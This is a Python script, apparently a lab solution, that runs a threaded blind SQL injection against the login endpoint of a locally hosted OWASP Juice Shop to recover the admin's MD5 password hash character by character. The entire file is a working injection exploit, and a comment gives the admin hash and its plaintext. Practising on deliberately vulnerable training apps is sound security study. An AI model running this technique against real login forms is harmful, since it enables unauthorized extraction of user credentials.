import requests
import time
from concurrent.futures import ThreadPoolExecutor

def make_request(i):
    url = "http://localhost:3000/rest/user/login"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36",
    }

    cookies = {
        "language": "en",
    }

    proxies = {
        "http": "http://localhost:8080",
        "https": "http://localhost:8080",
    }

    charList = "0123456789abcdefghijklmnopqrstuvwxyz"

    for chr in charList:
        data = {
            "email": f"admin@juice-sh.op' and substring(password,{i},1)='{chr}' -- -",
            "password": "fff"
        }

        response = requests.post(url, headers=headers, cookies=cookies, json=data, proxies=proxies, verify=False)

        if "Invalid email or password" not in response.text:
            print(f"Password {i}: {chr}")
            return chr
        
    return ''

def main():
    start_time = time.time()
    
    pwStr = ''
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(make_request, i) for i in range(1, 33)]
       
        for future in futures:
            result = future.result()

            if result:
                pwStr += result

    # admin123 = 0192023a7bbd73250516f069df18b500 (md5)
    print(f"Password : {pwStr}")

    if pwStr == "0192023a7bbd73250516f069df18b500":
        print("Success")  
    else:   
        print("Failed")     

    end_time = time.time()
    total_time = end_time - start_time
    print(f"Time: {total_time} seconds")

if __name__ == "__main__":
    main()